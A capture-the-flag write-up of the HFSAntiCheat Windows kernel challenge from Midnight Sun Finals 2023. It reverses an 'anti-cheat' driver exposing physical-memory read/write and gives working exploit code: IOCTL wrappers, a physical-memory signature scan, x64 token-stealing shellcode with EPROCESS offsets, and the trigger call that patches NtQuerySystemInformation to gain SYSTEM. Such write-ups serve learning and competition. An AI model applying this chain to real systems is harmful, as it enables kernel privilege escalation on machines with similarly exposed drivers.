---
layout: default
title: "HFSAntiCheat - Midnight Sun Finals 2023"
date: 2023-08-23
permalink: /hfsanticheat/
categories: ctf pwn shellcode windows kernel
---

This week I went to Midnight Sun CTF Finals 2023 in Stockholm, organised by [HackingForSoju](https://hackingforsoju.team/). I played with DiceGang Bleen, and mainly worked on `guessboy` (a really fun GameBoy pwn challenge on a physical GameBoy Color) and `HFSAntiCheat`, a Windows Kernel pwn challenge.

<!--more-->

# HFSAntiCheat
For this challenge, we're provided
- `hfsanticheat.sys`, a Windows Kernel 'anti-cheat' driver
- A Vagrantfile setup to run the challenge locally
- `ntoskrnl.exe`, the Windows Kernel binary running on the server
- `client.go`, a wrapper to solve a PoW and submit an exploit

## Driver Analysis
I spent a long time analysing the structure and behaviour of the driver. `WDFStructs.h` from [this IDA plugin](https://github.com/IOActive/kmdf_re/blob/master/code/WDFStructs.h) was a huge help in identifying functions which appeared to be loaded from a vtable. To summarise the driver's primary workflow:
- A function ('`ProcessCreateRoutine`') is registered as a callback to be run on all newly created processes
- The function checks first if the process's image path contains `CHEAT` (the server for the challenge runs our exploit in a binary with a name including the word 'CHEAT')
- If a 'potential cheat' is detected, the driver walks the PE header of the EXE to locate the import table
- If any of several suspicious functions are found to be imported (`OpenProcess`, `ReadProcessMemory`, `ReadFile` etc.), then the process is opened, killed and closed

For a while I got stuck in a rabbit hole of trying to exploit bugs in the PE walking code, such as not properly validating pointers. However, after stepping back and analysing the binary further, I noticed a reference to the string `\\Device\\PhysicalMemory`

## Physical Memory R/W
Following the Xrefs to this string back up, I found that while initializing the driver, `WdfIoQueueCreate` is called, creating a queue which dispatches IOCTL (or `IoDeviceControl`) events. The registered function accepts two opcodes (`0x220004` and `0x220008`), which both follow similar codepaths with small differences.

Both read a structure provided by the user of this form
```c
struct req {
  void* len;					// must be <= 0x1000
  int64_t* addr;			// must be a userspace pointer
  int64_t phys_addr;  // physical memory address
};
```
Both of these functions call out to (what I have named) `map_physmem`, shown below

```c
int64_t map_physmem(void* arg1, uint64_t size, void** mapped)
    phys_addr = arg1
    struct UNICODE_STRING str
    RtlInitUnicodeString(&str, u"\Device\PhysicalMemory")
    OBJECT_ATTRIBUTES oa
    oa.RootDirectory = 0
    oa.ObjectName = &str
    oa.Length = 0x30
    oa.Attributes = 0x40
    oa.SecurityDescriptor = 0
    oa.SecurityQualityOfService = 0
    int64_t rax = ZwOpenSection(&SectionHandle, 6, &oa)
    if (rax.d s>= 0)
        void* sec = SectionHandle
        *mapped = nullptr
        int32_t var_60_1 = 4
        int32_t var_68_1 = 0
        int32_t var_70_1 = 1
        uint64_t ViewSize = size
        int32_t rax_1 = ZwMapViewOfSection(SectionHandle: sec, ProcessHandle: -ffffffffffffffff, BaseAddress: mapped, ZeroBits: nullptr, CommitSize: size, SectionOffset: &phys_addr, ViewSize: &ViewSize)
        ZwClose(SectionHandle)
        rax = zx.q(rax_1)
    return rax
```
This function maps a slice of up to 0x1000 bytes of physical memory into the virtual address space. Depending on the opcode passed, the driver then either copies bytes _from_ userspace _to_ the physical memory or vice versa. This essentially gives us arbitrary read/write into any part of memory, bypassing page permissions and virtual address space KASLR.

## Strategy
From this point there's a few options. Luckily, I had previously written a somewhat similar challenge for Hack The Box - [OpenDoor](https://www.hackthebox.com/blog/open-door-business-ctf), a kernel write-what-where backdoor. The only significant difference here was that we had write into _physical_ addresses, and my solution for that challenge used `NtQuerySystemInformation` to leak _virtual_ addresses of various kernel objects.

From my understanding, the author's intended solution was to leak the CR3 register (stored somewhere in the low part of physical memory) in order to walk page tables and map virtual to physical addresses manually. However, I had recently read stong/cts/gf_256's [CVE-2020-15368 writeup](https://github.com/stong/CVE-2020-15368), in which code execution is gained by scanning physical memory for a known signature and replacing it. I chose to target `NtQuerySystemInformation`, as I surmised it would likely be very underused (therefore unlikely to brick the system) ~~and because I could copy-paste my code from a previous writeup to resolve and call it~~.

## Writing the Exploit
I began with a small 'framework' for interacting with the driver.
```c
#include <windows.h> 
#include <stdint.h>
#include <stdio.h>
#include <stdbool.h>
typedef  struct {
  size_t len;
  char* addr;
  int64_t phys_addr;
} Req;
NTSTATUS ReadPhysmem(HANDLE device, int64_t PhysAddr, size_t Length, char* buf) {
  Req request = { .len = Length, .addr = buf, .phys_addr = PhysAddr }; 
  return DeviceIoControl(device, 0x220004, &request, sizeof(request), NULL, 0, NULL, NULL); 
}
NTSTATUS WritePhysmem(HANDLE device, int64_t PhysAddr, size_t Length, char* buf) {
  Req request = { .len = Length, .addr = buf, .phys_addr = PhysAddr };
  return DeviceIoControl(device, 0x220008, &request, sizeof(request), NULL, 0, NULL, NULL);
}
int main(int argc, char** argv) {
  HANDLE device = CreateFileW(L"\\\\.\\HFSAntiCheat", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
  if (device == INVALID_HANDLE_VALUE) { 
    printf_s("[x] Could not open device: 0x%x\n", GetLastError());
    return FALSE;
  }
}
```

I then grabbed a chunk of bytes from the start of `NTQSI` (taking care not to include any bytes that might be relocated at runtime, making my search inaccurate), and made a simple loop to scan for it.

```c
const  char search[] = {
  0x40, 0x53, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xd2, 0x45, 0x8b, 0xd8, 0x66, 0x44, 0x89, 0x54,
  0x24, 0x40, 0x48, 0x8b, 0xda, 0x83, 0xf9, 0x4a, 0x7c, 0x24, 0x83, 0xf9, 0x53, 0x7d, 0x1f, 0x45,
  0x8b, 0xc2, 0x4c, 0x89, 0x4c, 0x24, 0x28, 0x49, 0x8b, 0xd2, 0x4c, 0x8b, 0xcb, 0x44, 0x89, 0x5c,
  0x24, 0x20
};

// ...
size_t i;
// scan only the 4gb of memory assigned to the VM
for (i = 0; i < 0xFFFFFFFF; i += 1024) {
  char buf[sizeof(search)] = { 0 };
  ReadPhysmem(device, i, sizeof(search), buf);
  // NTQSI is located on a page boundary in the kernel image,
  // so we can just check the start of each page
  if (memcmp(buf, search, sizeof(search)) == 0) {
    printf("found at %p\n", (void*)i);
    break; 
  }
 } 
 if (i >= 0xFFFFFFFF) { return  -1; }
```

I was able to verify that this locates the function reliably in about 1 second of searching (useful, as there was a 5 second timeout on the exploit).
I now had to replace the code with my payload.

## Token Stealing and Shellcoding

In my previous Write-What-Where exploit, the exploit was as follows
- Leak the address of an `_EPROCESS` belonging to SYSTEM
- Copy  the `Token` field, which contains a pointer to the security context
- Walk the process linked list to find our own `_EPROCESS` by checking the PID repeatedly
- Overwrite our `Token` field with that of SYSTEM in order to escalate privileges

Here, our exploit has to happen entirely in kernelspace and be fully automated. Luckily, [this blog post](https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/) had some great pointers on token-stealing-shellcode. As a pointer to the current task is stored in `gs:[0x188]`, and the process with ID 4 always belongs to SYSTEM, we can begin at our own task and walk until we find a PID field of 4.

### Offsets
However, there was an issue which meant I couldn't copy the shellcode verbatim. The layout of Windows Kernel structures changes frequently, and my kernel was several months more recent than the one in the blog, making the offsets inapplicable.
At this point, I spent several hours, using several cables, adapters and laptops to try and establish a WinDbg kernel debugging connection in order for me to inspect the structure layout.

However, whatever I did, I wasn't able to get a connection working, and resigned myself to reverse engineering the kernel binary itself to discover offsets. At which point, I loaded `ntoskrnl.exe` into Binary Ninja, waited for it to analyse - then suddenly noticed a PDB for the kernel containing all structures and offsets being downloaded from Microsoft's PDB server and imported into Binary Ninja's type system.

`<surprised Pikachu face>`

The writeup linked earlier will do a much better job than I will of explaining the logic of the shellcode, but, armed with my new offsets, my final shellcode was as follows:

```x86asm
mov rax, qword ptr gs:[0x188]
mov rax, [rax + 0xb8]
mov rbx, rax

__loop:
mov rbx, [rbx + 0x448]
sub rbx, 0x448
mov rcx, [rbx + 0x440]
cmp rcx, 4
jnz __loop

mov rcx, [rbx + 0x4b8]
and cl, 0xf0
mov [rax + 0x4b8], rcx
xor rax, rax
ret
```

## Solving
We're now ready to steal the token and get the flag!
```c
WritePhysmem(device, i, sizeof(shellcode), shellcode);
HINSTANCE hNtDLL = LoadLibraryA("ntdll.dll");
typedef  NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);
_NtQuerySystemInformation NtQuerySystemInformation = GetProcAddress(hNtDLL, "NtQuerySystemInformation"); NtQuerySystemInformation(0, NULL, 0, NULL);
```
## Closing Thoughts
It was a lot of fun to have another go at Windows Kernel exploitation. The main difficulty I had was finding resources on Windows physical memory layout - I would have had significantly more difficulty if the scan had taken too long and I needed to locate CR3 (or some other way to map virtual to physical addresses) in memory.

This challenge was sort of a two-parter with `HFSHyperRam`. The context was similar, but there was a custom VirtualBox device loaded. The goal of the challenge was to exploit bugs in the MMIO handling of the device in order to escape to the host.
I was scared off of this challenge a little, presuming that the exploit would require writing kernel shellcode to map the MMIO device into physical memory. It was only once another team solved it without first solving `HFSAntiCheat` that I realised that full kernel code execution was _not_ required, and the driver's physical memory read/write could be leveraged to interact with the driver. I would have liked to have had a proper attempt in hindsight, as I've not had an opportunity to do VM escape exploits in the past.

Overall, the whole CTF was a lot of fun, this challenge in particular, and huge thanks to the organisers and the other teams for the great experience!
